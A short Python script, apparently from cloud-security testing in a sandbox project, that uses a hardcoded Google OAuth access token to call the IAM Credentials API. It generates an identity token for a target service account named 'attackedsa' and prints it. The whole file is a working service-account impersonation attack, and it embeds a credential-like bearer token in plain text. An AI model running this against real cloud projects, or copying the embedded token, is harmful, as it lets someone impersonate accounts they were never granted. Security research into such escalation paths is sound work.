#!/usr/bin/env python3

ACCESS_TOKEN = "ya29.c.KrwCIgg7DXvcMa-nCxqVg7hxEhTlZsW_9zGgnbD7vQkXvvGdVLS2OH0fRf3oW-W7JzBz_bjqtpU9tlGXOO-ezcq604gPN-xMu2vXxcqY1NgpzNQ6MuSM402jHm6ngkdhRfgOXfc2eMF7PqwtN5H_Alm-L1AJELwpCs4XHzNej-n9nsbHTmdMRypgtwIyWoNsiluyge55zGczGVNamLXqgBiLD26s2Q9zZSCm9fLvWEHNPm7h-AonbrZI7ov5ubLKp7IKSZ1VOhInWz5xmL13WS5N9mKgdjWW0eSTKWJXb7G5wQWfSD__j1gjTCOgIJqC-gbuYRSsNNQ5NfiwxYmAgyZSHkLACL_tekttjQzLPA2W5xRlN0qFtLqy3HoZ5KEJmIbY4wFUWmwiqJLy1CzG3gBhkx9rtY8pJNGdadKJJw"
AUDIENCE = "https://accounts.google.com/o/oauth2/token"
TARGET_SA = "attackedsa@security-sandbox-4528.iam.gserviceaccount.com"

from apiclient.discovery import build
import google.oauth2.credentials
import json


def select(msg, choices):
    for i, value in enumerate(choices):
        print(f"{i}) {value['name']}")

    selection = None
    while not selection:
        index = input(msg)
        try:
            selection = choices[int(index)]
        except ValueError:
            continue
    return selection

creds = google.oauth2.credentials.Credentials(ACCESS_TOKEN)
service = build(serviceName='iamcredentials', version='v1', credentials=creds)


body = {
  "delegates": [
  ],
  "audience": "*",
  "includeEmail": False
}

res = service.projects().serviceAccounts().generateIdToken(name=f'projects/-/serviceAccounts/{TARGET_SA}', body=body).execute()

print(json.dumps(res, indent=4))
